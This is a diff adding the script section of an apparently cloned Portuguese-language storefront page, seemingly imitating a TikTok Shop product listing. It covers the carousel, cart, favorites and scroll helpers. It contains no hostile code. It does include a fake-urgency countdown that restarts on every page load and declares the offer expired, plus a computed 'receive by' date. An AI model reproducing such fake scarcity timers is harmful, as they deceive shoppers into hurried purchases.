+        setTimeout(() => {
+            fullscreenContainer.style.display = 'none';
+        }, 300);
+    }
+}
+
+// Função para navegar entre imagens no modal de tela cheia
+function changeImageInFullscreen(direction) {
+    const productImages = [
+        './images/imagc1.png',
+        'images/carrosel1.html',
+        'images/carrosel2.html',
+        'images/carrosel3.html',
+        'images/carrosel4.html',
+        'images/body.html',
+        'images/panela1.html',
+        'images/panela2.html',
+        'images/panela3.html',
+    ];
+    
+    currentImageIndex += direction;
+    
+    if (currentImageIndex < 0) {
+        currentImageIndex = productImages.length - 1;
+    } else if (currentImageIndex >= productImages.length) {
+        currentImageIndex = 0;
+    }
+    
+    const fullscreenImage = document.getElementById('fullscreen-image');
+    if (fullscreenImage) {
+        fullscreenImage.src = productImages[currentImageIndex];
+    }
+}
+
+// ===== TEMPORIZADOR DE COUNTDOWN =====
+// Temporizador de 5 minutos
+function startCountdown() {
+    let minutes = 19;
+    let seconds = 31;
+    const timerElement = document.getElementById('countdown-timer');
+    
+    if (!timerElement) return;
+    
+    const countdownInterval = setInterval(() => {
+        // Formata os minutos e segundos com dois dígitos
+        const formattedMinutes = minutes.toString().padStart(2, '0');
+        const formattedSeconds = seconds.toString().padStart(2, '0');
+        
+        // Atualiza o texto do temporizador
+        timerElement.textContent = `Termina em ${formattedMinutes}:${formattedSeconds}`;
+        
+        // Decrementa o tempo
+        if (seconds === 0) {
+            if (minutes === 0) {
+                // Tempo esgotado
+                clearInterval(countdownInterval);
+                timerElement.textContent = 'Oferta expirada!';
+                timerElement.style.color = '#999';
+                return;
+            }
+            minutes--;
+            seconds = 59;
+        } else {
+            seconds--;
+        }
+    }, 1000);
+}
+
+// ===== DATA DE ENTREGA DINÂMICA =====
+// Função para data de entrega dinâmica
+function updateShippingDate() {
+    const shippingDateElement = document.getElementById('shipping-date');
+    if (!shippingDateElement) return;
+    
+    const today = new Date();
+    
+    // Adicionar 5 dias úteis (pulando finais de semana)
+    let deliveryDate = new Date(today);
+    let daysAdded = 0;
+    
+    while (daysAdded < 5) {
+        deliveryDate.setDate(deliveryDate.getDate() + 1);
+        // Se não é sábado (6) nem domingo (0), conta como dia útil
+        if (deliveryDate.getDay() !== 0 && deliveryDate.getDay() !== 6) {
+            daysAdded++;
+        }
+    }
+    
+    // Formatar a data
+    const day = deliveryDate.getDate();
+    const month = deliveryDate.toLocaleString('pt-BR', { month: 'short' });
+    
+    shippingDateElement.textContent = `Receba até ${day} de ${month}`;
+}
+
+// ===== SISTEMA DE FAVORITOS =====
+let isSaved = false;
+
+function toggleSave() {
+    isSaved = !isSaved;
+    const saveIcon = document.getElementById('save-icon');
+    const saveButton = document.getElementById('save-button');
+    
+    if (!saveIcon || !saveButton) return;
+    
+    if (isSaved) {
+        // Coração preenchido (salvo)
+        saveIcon.innerHTML = `<path d="M12 21.35L10.55 20.03C5.4 15.36 2 12.28 2 8.5C2 5.42 4.42 3 7.5 3C9.24 3 10.91 3.81 12 5.09C13.09 3.81 14.76 3 16.5 3C19.58 3 22 5.42 22 8.5C22 12.28 18.6 15.36 13.45 20.04L12 21.35Z" fill="#ff2d55" stroke="#ff2d55" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>`;
+        saveButton.style.backgroundColor = '#fff5f5';
+        saveButton.style.transform = 'scale(1.1)';
+        setTimeout(() => { saveButton.style.transform = 'scale(1)'; }, 200);
+    } else {
+        // Coração vazio (não salvo)
+        saveIcon.innerHTML = `<path d="M12 21.35L10.55 20.03C5.4 15.36 2 12.28 2 8.5C2 5.42 4.42 3 7.5 3C9.24 3 10.91 3.81 12 5.09C13.09 3.81 14.76 3 16.5 3C19.58 3 22 5.42 22 8.5C22 12.28 18.6 15.36 13.45 20.04L12 21.35Z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>`;
+        saveButton.style.backgroundColor = 'transparent';
+    }
+}
+
+// ===== BOTÃO VOLTAR AO TOPO =====
+// Função para mostrar/ocultar o botão
+function toggleBackToTop() {
+    const backToTopButton = document.getElementById('back-to-top');
+    if (!backToTopButton) return;
+    
+    const scrollPosition = window.scrollY;
+    const windowHeight = window.innerHeight;
+    const documentHeight = document.documentElement.scrollHeight;
+    
+    // Mostrar botão quando estiver no final da página
+    if (scrollPosition + windowHeight >= documentHeight - 100) {
+        backToTopButton.style.display = 'flex';
+    } else {
+        backToTopButton.style.display = 'none';
+    }
+}
+
+// Função para voltar ao topo
+function scrollToTop() {
+    window.scrollTo({
+        top: 0,
+        behavior: 'smooth'
+    });
+}
+
+function setupFlavorSelector() {
+    const flavorButtons = document.querySelectorAll('.flavor-button');
+    if (!flavorButtons.length) return;
+
+    const selectableButtons = Array.from(flavorButtons).filter(button => {
+        return !button.classList.contains('flavor-button-disabled') && !button.disabled;
+    });
+
+    selectableButtons.forEach(button => {
+        button.addEventListener('click', function() {
+            selectableButtons.forEach(btn => {
+                btn.classList.remove('selected');
+                btn.setAttribute('aria-pressed', 'false');
+            });
+            this.classList.add('selected');
+            this.setAttribute('aria-pressed', 'true');
+        });
+    });
+}
+
+// ===== SISTEMA DE TOAST MELHORADO =====
+(function(){
+    // cria um toast no mesmo estilo que você mostrou e remove após 2s
+    function createToast(text) {
+        const message = document.createElement('div');
+        message.textContent = text;
+        Object.assign(message.style, {
+            position: 'fixed',
+            top: '20px',
+            right: '20px',
+            background: '#ff2d55',
+            color: 'white',
+            padding: '12px 16px',
+            borderRadius: '8px',
+            zIndex: 10000,
+            fontWeight: 600,
+            boxShadow: '0 4px 12px rgba(0,0,0,0.15)',
+            transition: 'opacity 0.5s',
+            opacity: '1',
+        });
+
+        // evita múltiplos toasts idênticos: remove toasts anteriores iguais
+        const existing = document.querySelectorAll('.custom-search-toast');
+        existing.forEach(n => n.parentNode && n.parentNode.removeChild(n));
+
+        message.className = 'custom-search-toast';
+        document.body.appendChild(message);
+
+        // sumir depois de 2s
+        setTimeout(() => {
+            message.style.opacity = '0';
+            setTimeout(() => { 
+                if (message.parentNode) message.parentNode.removeChild(message); 
+            }, 500);
+        }, 2000);
+    }
+
+    // expõe função global compatível (caso algo chame showSearchDisabledMessage)
+    window.showSearchDisabledMessage = function() {
+        createToast('❌ Não é possível realizar pesquisas nesta loja.');
+    };
+
+    // anexa listener ao botão (mais confiável que onclick inline)
+    document.addEventListener('DOMContentLoaded', function() {
+        const btn = document.getElementById('search-btn');
+        if (!btn) {
+            console.warn('search-btn não encontrado — verifique o id no HTML');
+            return;
+        }
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            // chama a função global (ou createToast diretamente)
+            window.showSearchDisabledMessage();
+        });
+    });
+})();
+
+// ===== INICIALIZAÇÃO PRINCIPAL =====
+// Inicializar quando a página carregar
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('Página carregada - verificando carrinho');
+    
+    // CARRINHO: Garantir que inicie vazio - limpar qualquer dado antigo
+    console.log('Limpando carrinho para garantir início limpo');
+    localStorage.removeItem('tiktokShopCart');
+    
+    // Agora atualizar contador (deve mostrar 0)
+    updateCartCount();
+    setupCartListeners();
+    setupFlavorModal();
+    
+    const addToCartBtn = document.getElementById('add-to-cart-btn');
+    if (addToCartBtn) {
+        addToCartBtn.addEventListener('click', function() {
+            console.log('Botão Adicionar ao Carrinho clicado');
+            addToCart(currentProduct);
+        });
+    }
+    
+    const buyNowBtn = document.getElementById('buy-now-btn');
+    if (buyNowBtn) {
+        buyNowBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            console.log('Botão Comprar Agora clicado');
+            openFlavorModal();
+        });
+    }
+    
+    // Verifica se há algo no carrinho ao carregar
+    const initialCart = getCart();
+    console.log('Carrinho inicial (deve estar vazio):', initialCart);
+    
+    // TABS STICKY: Clona as tabs originais para a versão sticky
+    const originalTabs = document.querySelector('.tabs');
+    if (originalTabs) {
+        const stickyTabs = originalTabs.cloneNode(true);
+        stickyTabs.id = 'sticky-tabs';
+        stickyTabs.style.cssText = 'display: none; position: sticky; top: 57px; z-index: 99; background: white; border-bottom: 1px solid #f0f0f0;';
+
+        // Insere após o header
+        const header = document.getElementById('main-header');
+        if (header && header.parentNode) {
+            header.parentNode.insertBefore(stickyTabs, header.nextSibling);
+        }
+    }
+
+    // BOTÃO VOLTAR AO TOPO
+    const backToTopButton = document.getElementById('back-to-top');
+    if (backToTopButton) {
+        backToTopButton.addEventListener('click', scrollToTop);
+    }
+
+    // Inicializa todos os sistemas
+    setupSectionObserver();
+    startCountdown();
+    updateShippingDate();
+    setupFlavorSelector();
+    handleStickyTabs();
+    toggleBackToTop();
+});
+
+// Event listeners para scroll
+window.addEventListener('scroll', handleStickyTabs);
+window.addEventListener('scroll', toggleBackToTop);
+
+// Expor funções globais necessárias
+window.updateCartCount = updateCartCount;
+window.showSearchDisabledMessage = showSearchDisabledMessage;
+window.scrollToVisaoGeral = scrollToVisaoGeral;
+window.scrollToAvaliacoes = scrollToAvaliacoes;
+window.scrollToDescription = scrollToDescription;
+window.scrollToRecomendacoes = scrollToRecomendacoes;
+window.showTab = showTab;
+window.openFullscreen = openFullscreen;
+window.closeFullscreen = closeFullscreen;
+window.changeImageInFullscreen = changeImageInFullscreen;
+window.toggleSave = toggleSave;
+window.scrollToTop = scrollToTop;
+</script>
+<div style="display: none;">
+	<script id="_wauhp9">
+	  var _wau = _wau || [];
+	  _wau.push(["small", "3406wyqmot", "hp9"]);
+	</script>
+	<script async="" src="../../waust.at/s.js"></script>
+&nbsp;&nbsp;</div>
+
+<!-- Code injected by live-server -->
+<script>
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script>
+
+
+
+
+<div id="kins-kins-popup" style="color-scheme: initial; forced-color-adjust: initial; mask: initial; math-depth: initial; position: initial; position-anchor: initial; text-size-adjust: initial; appearance: initial; color: initial; direction: ltr; font-family: Rubik, sans-serif; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-size: medium; font-size-adjust: initial; font-stretch: initial; font-style: initial; font-synthesis: initial; font-variant: initial; font-variation-settings: initial; font-weight: initial; position-area: initial; text-orientation: initial; text-rendering: initial; text-spacing-trim: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; anchor-name: initial; anchor-scope: initial; animation-composition: initial; animation: initial; app-region: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: none; background-blend-mode: initial; baseline-shift: initial; baseline-source: initial; block-size: initial; border-block: initial; border: none; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; inset: initial; box-decoration-break: initial; box-shadow: initial; box-sizing: border-box; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-animation: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; corner-shape: initial; corner-block-end-shape: initial; corner-block-start-shape: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: block !important; dominant-baseline: initial; dynamic-range-limit: initial; empty-cells: initial; field-sizing: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: auto; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; initial-letter: initial; inline-size: initial; inset-block: initial; inset-inline: initial; interest-delay: initial; interpolate-size: initial; isolation: initial; letter-spacing: initial; lighting-color: initial; line-break: initial; line-height: normal; list-style: initial; margin-block: initial; margin: 0px; margin-inline: initial; marker: initial; mask-type: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-block: initial; overflow-clip-margin: initial; overflow-inline: initial; overflow-wrap: initial; overflow: initial; overlay: initial; overscroll-behavior-block: none; overscroll-behavior-inline: none; overscroll-behavior: none; padding-block: initial; padding: 0px; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position-try: initial; position-visibility: initial; print-color-adjust: initial; quotes: initial; r: initial; reading-flow: initial; reading-order: initial; resize: initial; rotate: initial; ruby-align: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-initial-target: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-marker-group: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scroll-target-group: initial; scroll-timeline: initial; scrollbar-color: initial; scrollbar-gutter: initial; scrollbar-width: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: left; text-align-last: initial; text-anchor: initial; text-autospace: initial; text-box: initial; text-combine-upright: initial; text-decoration: none; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; text-wrap: wrap; timeline-scope: initial; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; view-timeline: initial; view-transition-class: initial; view-transition-group: initial; view-transition-name: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; white-space-collapse: collapse; widows: initial; width: auto; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: initial;"><style>
+                    #kins_root {
+                        display: block !important;
+                    }
+                </style><div id="kins_root" style="color-scheme: initial; forced-color-adjust: initial; mask: initial; math-depth: initial; position: initial; position-anchor: initial; text-size-adjust: initial; appearance: initial; color: initial; direction: ltr; font-family: Rubik, sans-serif; font-feature-settings: initial; font-kerning: initial; font-optical-sizing: initial; font-palette: initial; font-size: medium; font-size-adjust: initial; font-stretch: initial; font-style: initial; font-synthesis: initial; font-variant: initial; font-variation-settings: initial; font-weight: initial; position-area: initial; text-orientation: initial; text-rendering: initial; text-spacing-trim: initial; -webkit-font-smoothing: initial; -webkit-locale: initial; -webkit-text-orientation: initial; -webkit-writing-mode: initial; writing-mode: initial; zoom: initial; accent-color: initial; place-content: initial; place-items: initial; place-self: initial; alignment-baseline: initial; anchor-name: initial; anchor-scope: initial; animation-composition: initial; animation: initial; app-region: initial; aspect-ratio: initial; backdrop-filter: initial; backface-visibility: initial; background: none; background-blend-mode: initial; baseline-shift: initial; baseline-source: initial; block-size: initial; border-block: initial; border: none; border-radius: initial; border-collapse: initial; border-end-end-radius: initial; border-end-start-radius: initial; border-inline: initial; border-start-end-radius: initial; border-start-start-radius: initial; inset: initial; box-decoration-break: initial; box-shadow: initial; box-sizing: border-box; break-after: initial; break-before: initial; break-inside: initial; buffered-rendering: initial; caption-side: initial; caret-animation: initial; caret-color: initial; clear: initial; clip: initial; clip-path: initial; clip-rule: initial; color-interpolation: initial; color-interpolation-filters: initial; color-rendering: initial; columns: initial; column-fill: initial; gap: initial; column-rule: initial; column-span: initial; contain: initial; contain-intrinsic-block-size: initial; contain-intrinsic-size: initial; contain-intrinsic-inline-size: initial; container: initial; content: initial; content-visibility: initial; corner-shape: initial; corner-block-end-shape: initial; corner-block-start-shape: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; cursor: initial; cx: initial; cy: initial; d: initial; display: block; dominant-baseline: initial; dynamic-range-limit: initial; empty-cells: initial; field-sizing: initial; fill: initial; fill-opacity: initial; fill-rule: initial; filter: initial; flex: initial; flex-flow: initial; float: initial; flood-color: initial; flood-opacity: initial; grid: initial; grid-area: initial; height: auto; hyphenate-character: initial; hyphenate-limit-chars: initial; hyphens: initial; image-orientation: initial; image-rendering: initial; initial-letter: initial; inline-size: initial; inset-block: initial; inset-inline: initial; interest-delay: initial; interpolate-size: initial; isolation: initial; letter-spacing: initial; lighting-color: initial; line-break: initial; line-height: normal; list-style: initial; margin-block: initial; margin: 0px; margin-inline: initial; marker: initial; mask-type: initial; math-shift: initial; math-style: initial; max-block-size: initial; max-height: initial; max-inline-size: initial; max-width: initial; min-block-size: initial; min-height: initial; min-inline-size: initial; min-width: initial; mix-blend-mode: initial; object-fit: initial; object-position: initial; object-view-box: initial; offset: initial; opacity: initial; order: initial; orphans: initial; outline: initial; outline-offset: initial; overflow-anchor: initial; overflow-block: initial; overflow-clip-margin: initial; overflow-inline: initial; overflow-wrap: initial; overflow: initial; overlay: initial; overscroll-behavior-block: none; overscroll-behavior-inline: none; overscroll-behavior: none; padding-block: initial; padding: 0px; padding-inline: initial; page: initial; page-orientation: initial; paint-order: initial; perspective: initial; perspective-origin: initial; pointer-events: initial; position-try: initial; position-visibility: initial; print-color-adjust: initial; quotes: initial; r: initial; reading-flow: initial; reading-order: initial; resize: initial; rotate: initial; ruby-align: initial; ruby-position: initial; rx: initial; ry: initial; scale: initial; scroll-behavior: initial; scroll-initial-target: initial; scroll-margin-block: initial; scroll-margin: initial; scroll-margin-inline: initial; scroll-marker-group: initial; scroll-padding-block: initial; scroll-padding: initial; scroll-padding-inline: initial; scroll-snap-align: initial; scroll-snap-stop: initial; scroll-snap-type: initial; scroll-target-group: initial; scroll-timeline: initial; scrollbar-color: initial; scrollbar-gutter: initial; scrollbar-width: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; shape-rendering: initial; size: initial; speak: initial; stop-color: initial; stop-opacity: initial; stroke: initial; stroke-dasharray: initial; stroke-dashoffset: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-width: initial; tab-size: initial; table-layout: initial; text-align: left; text-align-last: initial; text-anchor: initial; text-autospace: initial; text-box: initial; text-combine-upright: initial; text-decoration: none; text-decoration-skip-ink: initial; text-emphasis: initial; text-emphasis-position: initial; text-indent: initial; text-overflow: initial; text-shadow: initial; text-transform: initial; text-underline-offset: initial; text-underline-position: initial; text-wrap: wrap; timeline-scope: initial; touch-action: initial; transform: initial; transform-box: initial; transform-origin: initial; transform-style: initial; transition: initial; translate: initial; user-select: initial; vector-effect: initial; vertical-align: initial; view-timeline: initial; view-transition-class: initial; view-transition-group: initial; view-transition-name: initial; visibility: initial; border-spacing: initial; -webkit-box-align: initial; -webkit-box-decoration-break: initial; -webkit-box-direction: initial; -webkit-box-flex: initial; -webkit-box-ordinal-group: initial; -webkit-box-orient: initial; -webkit-box-pack: initial; -webkit-box-reflect: initial; -webkit-line-break: initial; -webkit-line-clamp: initial; -webkit-mask-box-image: initial; -webkit-rtl-ordering: initial; -webkit-ruby-position: initial; -webkit-tap-highlight-color: initial; -webkit-text-combine: initial; -webkit-text-decorations-in-effect: initial; -webkit-text-fill-color: initial; -webkit-text-security: initial; -webkit-text-stroke: initial; -webkit-user-drag: initial; white-space-collapse: collapse; widows: initial; width: auto; will-change: initial; word-break: initial; word-spacing: initial; x: initial; y: initial; z-index: initial;"></div></div></body></html>
